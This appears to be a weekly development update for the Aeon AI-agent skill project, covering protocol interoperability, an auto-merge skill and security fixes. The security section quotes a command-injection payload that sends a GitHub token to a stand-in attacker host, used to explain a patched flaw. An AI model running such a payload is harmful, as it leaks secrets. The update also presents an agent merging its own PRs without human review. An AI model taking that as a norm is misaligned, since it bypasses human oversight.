# Week in Review: Aeon Becomes Interoperable

*2026-04-18 — Weekly shipping update*

## The Big Picture

The week of April 12–18 was the week Aeon stopped being a Claude-specific cron tool and became a general-purpose skill layer. Two interoperability surfaces (MCP and A2A) shipped back-to-back, the skill catalog crossed 90, the auto-merge loop closed the self-improve cycle, a critical script-injection vector got patched, and the upstream repo finally landed an MIT License — just in time for the first external consumers A2A and MCP brought in. Every layer of the stack moved: distribution, security, governance, and content.

## What Shipped

### Aeon Is Now Installable From Any Agent Framework
The biggest shift of the week was interoperability. Monday's MCP Skill Adaptor (PR #28) turned every Aeon skill into a native Claude tool: `./add-mcp` runs once, and suddenly `aeon-morning-brief`, `aeon-deep-research`, and 90-plus others are callable directly from Claude Desktop or Claude Code — no fork, no GitHub Actions, no schedule. Three days later, the A2A Protocol Gateway (PR #35) extended the same reach to everyone else. A zero-dependency TypeScript server exposes the full skill catalog via Google's open Agent2Agent protocol, so LangChain, AutoGen, CrewAI, OpenAI Agents SDK, and Vertex AI agents can invoke Aeon skills via plain HTTP + JSON-RPC, with SSE streaming for long-running runs. The protocol itself has grown to 150+ organizations and was promoted to Linux Foundation governance this year — Aeon is now one of the first community skill libraries exposed on it. Between MCP for Claude-native clients and A2A for everyone else, Aeon is addressable from any major orchestration layer without custom glue.

### The Self-Improve Loop Actually Closes Now
For weeks, Aeon's self-improvement cycle — detect a gap, write a skill, open a PR, merge, repeat — had been stalling at the 3-PR guard. Green PRs would sit because humans couldn't review fast enough, and the guard stopped new feature branches from opening. The `auto-merge` skill (PR #31) fixes that. It lists open PRs, filters to fully green ones (`MERGEABLE` + no `CHANGES_REQUESTED` + all checks green), squash-merges up to 3 per run, and only notifies when something actually merged. For the first time this week, the agent can land its own green work without a human in the critical path. Paired with last week's `skill-version-tracking` (which records every imported skill's SHA in `skills.lock`), the cycle is now end-to-end: import with provenance, improve, PR, auto-merge, repeat.

### Distribution Past the Repo: Dev.to and Farcaster
Content that only lives in the GitHub Pages gallery is content nobody reads. The `syndicate-article` skill (PR #36) auto-cross-posts every published article to Dev.to with a canonical URL pointing back to the gallery — Aeon articles now reach Dev.to's million-plus developer audience without the author lifting a finger. Friday (PR #40) extended the same skill to Farcaster via Neynar's managed signers, adding independent channel enablement so Dev.to and Farcaster activate separately. The Farcaster side is where the crypto-native audience lives, overlapping directly with $AEON token holders. Both channels share the sandbox-fallback pattern — requests queue to `.pending-devto/` and `.pending-farcaster/`, then a postprocess script runs with secrets after the Claude step finishes.

### Security and Governance Got Serious
Two security moves this week deserve their own paragraphs. First, a critical script injection audit of `messages.yml` (PR #29) found that user-controlled message content was flowing into shell `run:` blocks via GitHub Actions template expressions — meaning any Telegram/Discord/Slack message like `$(curl evil.com?t=$GITHUB_TOKEN)` would execute with full job secrets. The fix wraps every user-controlled value in an intermediary `env:` variable, removing the template-expansion path entirely. Second, a subtler one: `skill-update-check` was auto-advancing `skills.lock` commit SHAs whenever its security scan returned PASS. That's automatic trust elevation on a security verdict — exactly the supply-chain pattern the agent ecosystem should never normalize. PR #34 removed the auto-advance entirely; the lock file is now strictly an audit trail until a human runs `./add-skill`. On the governance side, the aeon repo finally got its MIT License on April 17 — 45 days after the first commit, but critically *before* the first external A2A demo. Forks can now backport, and downstream consumers have an explicit grant.

### The Skill Catalog Exploded Past 90
A massive fork-merge (`ba0143d`) brought 25 new skills upstream — prediction market monitors, DeFi trackers, vuln scanners, content-channel digests, skill-repair, skill-leaderboard, and more. The `skill-graph` skill (PR #38) ships a Mermaid dependency map of all 91 skills across 4 category groups and 18 dependency edges, making the catalog navigable for the first time. The star-milestone announcer (PR #39) landed Friday to catch the imminent 200-star crossing (the repo is at 191 as of Saturday). And `skill-leaderboard` (aeon-agent PR #9, with a same-day pagination fix in #11) started ranking which skills forks adopt most — feedback that'll shape what lands on the default install path.

## Fixes & Improvements

- **Duplicate-notification fix (aeon `02c38f3`):** every `.pending-notify/` file was getting sent twice — once immediately, once by the post-run retry — because delivery wasn't being tracked. Now each channel flips a `DELIVERED=true` flag and clears the payload on success.
- **fetch-tweets finally stable:** 11 iterations across Thursday and Friday landed persistent seen-file dedup, a strict cashtag post-filter, and a 1-day search window. Went from `FETCH_TWEETS_EMPTY` every run to 6–15 fresh tweets per run.
- **tweet-allocator single-gate rewrite (`70845cb`):** collapsed the candidate/pending/paid state machine into one path — Bankr wallet or nothing. Ten handles paid in $AEON across three runs.
- **Telegram HTML mode (`a06943e`):** legacy Markdown was eating underscores in handles. HTML mode with a safe pre-pass now preserves them verbatim.
- **Opus 4.7 default bump (`15d8f18`, `58753a9`):** both repos now run Opus 4.7 as the default after a successful `memory-flush` pilot.
- **Heartbeat escalation (aeon-agent PR #12) + repo-pulse same-day dedup (PR #15):** persistent issues no longer suppressed by stale dedup; multi-run days no longer produce near-duplicate pings.
- **Workflow hygiene:** standardized `.gitignore` across both repos, removed 634 lines of leftover scratch files, and fixed a silent-data-loss bug where three skills wrote to a non-existent `output/` directory.

## By the Numbers

- **Commits:** ~330 across 2 repos (53 on aeon, ~275 on aeon-agent including cron chores; ~90 human-source commits total)
- **PRs merged:** 19 (12 on aeon, 7 on aeon-agent)
- **Lines changed:** ~+14,500 / –3,200
- **Files touched:** ~350
- **New skills shipped:** 7 direct + 25 via fork merge (auto-merge, skill-version-tracking, A2A gateway, syndicate-article with Dev.to + Farcaster, skill-graph, star-milestone, skill-leaderboard, monitor-kalshi, tweet-allocator, plus 25 merged from fork)
- **Contributors:** Aaron Elijah Mars, aeonframework (bot), aaronjmars, Aeon
- **Repo health:** aeon at 191 stars / 29 forks, aeon-agent at 6 stars / 1 fork

## Momentum Check

This is the highest-velocity week Aeon has had. Roughly 90 human-source commits and 19 merged PRs compares to 40–50 commits in each of the prior two weeks. More importantly, the *character* of shipping shifted: early-April weeks were skill-addition weeks, this was a protocol-adoption week. MCP + A2A + auto-merge + MIT License is a coherent bundle — Aeon positioning as infrastructure, not a product. April 18 was also the first recorded full autonomous cron day on aeon-agent main, with zero human source-level commits and every state change driven by the scheduler. The scheduler-as-operator pattern is live.

## What's Next

Three threads are most likely to land next week. First, the 200-star milestone on aeon — PR #39 merged Friday so `star-milestone` will catch the crossing automatically, likely within two days at the current ~7/day rate. Second, the first external A2A integrations: the MIT License cleared the last governance blocker, so example repos from LangChain/AutoGen users are probable. Third, continued tightening of the autonomous loop — `skill-evals` + `skill-repair` now have `eval-audit` coverage, which means auto-generated eval specs for uncovered skills and more auto-opened quality-fix PRs. Dashboard live feed, public status page, and memory search API remain the highest-priority unbuilt ideas — any could be next week's anchor.

---

*Sources: [aaronjmars/aeon](https://github.com/aaronjmars/aeon), [aaronjmars/aeon-agent](https://github.com/aaronjmars/aeon-agent). External context: [A2A Protocol (Linux Foundation)](https://www.linuxfoundation.org/press/linux-foundation-launches-the-agent2agent-protocol-project-to-enable-secure-intelligent-communication-between-ai-agents), [Agent2Agent protocol 1-year milestone (150+ orgs)](https://cloud.google.com/blog/products/ai-machine-learning/agent2agent-protocol-is-getting-an-upgrade).*
